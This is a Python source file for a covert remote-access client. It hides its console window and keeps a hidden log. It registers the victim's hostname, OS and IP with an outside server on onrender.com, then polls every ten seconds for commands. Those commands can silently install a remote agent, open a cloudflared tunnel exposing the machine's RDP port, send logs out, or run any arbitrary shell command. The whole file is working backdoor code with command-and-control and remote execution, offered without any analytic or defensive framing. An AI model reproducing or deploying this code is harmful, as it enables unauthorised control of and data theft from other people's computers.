import requests
import socket
import platform
import os
import subprocess
import time
import sys
import shutil
import datetime

# ========== CONFIGURATION ==========
SERVER_URL = "https://dollar-1rtv.onrender.com"
EXE_NAME = "1"
GROUP_ID = "-1003587821331"  # REPLACE with your actual group ID
# ==================================

# Hide the console window completely
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ========== LOGGING SETUP ==========
LOG_DIR = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), 'PD_Research')
LOG_FILE = os.path.join(LOG_DIR, 'debug.log')

def log_message(message):
    """Write a message to the hidden log file"""
    try:
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR, exist_ok=True)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
    except:
        pass

def read_log():
    """Read the log file contents"""
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                return f.read()
        return "Log file not found."
    except:
        return "Error reading log file."

# ====================================

log_message("=== CLIENT STARTED ===")
log_message(f"EXE_NAME: {EXE_NAME}")
log_message(f"Device: {socket.gethostname()}")

def get_computer_info():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return {
            'hostname': hostname,
            'os': platform.system(),
            'os_version': platform.version(),
            'ip': ip
        }
    except:
        return {
            'hostname': 'Unknown',
            'os': 'Unknown',
            'os_version': 'Unknown',
            'ip': 'Unknown'
        }

def install_pdagent():
    """Install Pocket Desk Agent on the target device automatically"""
    log_message("Checking if pdagent is installed...")
    try:
        result = subprocess.run("where pdagent", shell=True, capture_output=True)
        if result.returncode != 0:
            log_message("pdagent not found. Installing...")
            subprocess.run("pip install pocket-desk-agent", shell=True, capture_output=True, timeout=120)
            log_message("pdagent installed successfully.")
            return True
        log_message("pdagent is already installed.")
        return True
    except Exception as e:
        log_message(f"ERROR installing pdagent: {str(e)}")
        return False

def register_device():
    data = {
        'device_id': socket.gethostname(),
        'exe_name': EXE_NAME,
        'computer_info': get_computer_info(),
        'group_id': GROUP_ID
    }
    try:
        response = requests.post(f"{SERVER_URL}/register", json=data, timeout=10)
        log_message(f"Registration response: {response.status_code}")
        return True
    except Exception as e:
        log_message(f"Registration failed: {str(e)}")
        return False

def clear_command(device_id):
    try:
        requests.post(f"{SERVER_URL}/clear_command", json={'device_id': device_id}, timeout=5)
    except:
        pass

def get_cloudflared():
    """Get the cloudflared.exe from the bundled resources"""
    log_message("Getting cloudflared.exe...")
    try:
        base_path = sys._MEIPASS if getattr(sys, '_MEIPASS', False) else os.path.dirname(os.path.abspath(__file__))
        source_path = os.path.join(base_path, 'cloudflared.exe')
        target_dir = os.path.join(os.environ.get('TEMP', 'C:\\Temp'))
        target_path = os.path.join(target_dir, 'cloudflared.exe')
        
        if os.path.exists(target_path):
            log_message(f"cloudflared.exe already exists at: {target_path}")
            return target_path
        
        shutil.copy2(source_path, target_path)
        log_message(f"cloudflared.exe copied to: {target_path}")
        return target_path
    except Exception as e:
        log_message(f"ERROR getting cloudflared: {str(e)}")
        return None

def execute_command(command):
    log_message(f"Executing command: {command}")
    try:
        if command == "START_REMOTE":
            log_message("Starting remote session...")
            
            # Install pdagent first if needed
            install_pdagent()
            
            # Get the cloudflared executable
            cloudflared_path = get_cloudflared()
            if cloudflared_path and os.path.exists(cloudflared_path):
                log_message(f"cloudflared found at: {cloudflared_path}")
                # Start the remote session using cloudflared
                subprocess.Popen([cloudflared_path, "tunnel", "--url", "rdp://localhost:3389"], 
                               shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                log_message("cloudflared tunnel started successfully.")
            else:
                log_message("cloudflared not available. Trying pdagent remote...")
                subprocess.Popen(["pdagent", "remote"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                log_message("pdagent remote started.")
                
        elif command == "STOP_REMOTE":
            log_message("Stopping remote session...")
            subprocess.run("taskkill /f /im cloudflared.exe", shell=True, capture_output=True)
            log_message("Remote session stopped.")
            
        elif command == "FETCH_LOG":
            log_message("Fetch log command received.")
            # Send log to server
            log_content = read_log()
            try:
                requests.post(f"{SERVER_URL}/log", json={'device_id': socket.gethostname(), 'log': log_content}, timeout=10)
                log_message("Log sent to server.")
            except Exception as e:
                log_message(f"Error sending log to server: {str(e)}")
        else:
            log_message(f"Running custom command: {command}")
            subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
            log_message("Custom command executed.")
    except Exception as e:
        log_message(f"ERROR executing command: {str(e)}")

def check_for_commands():
    try:
        response = requests.get(f"{SERVER_URL}/devices", timeout=10)
        all_devices = response.json()
        device_id = socket.gethostname()
        if device_id in all_devices and all_devices[device_id].get('pending_command'):
            command = all_devices[device_id]['pending_command']
            log_message(f"Found pending command: {command}")
            execute_command(command)
            clear_command(device_id)
            log_message("Command cleared.")
        else:
            log_message("No pending commands.")
    except Exception as e:
        log_message(f"ERROR checking commands: {str(e)}")

def main():
    log_message("Main function started.")
    register_device()
    install_pdagent()
    log_message("Client is now running and checking for commands.")
    while True:
        check_for_commands()
        time.sleep(10)

if __name__ == '__main__':
    main()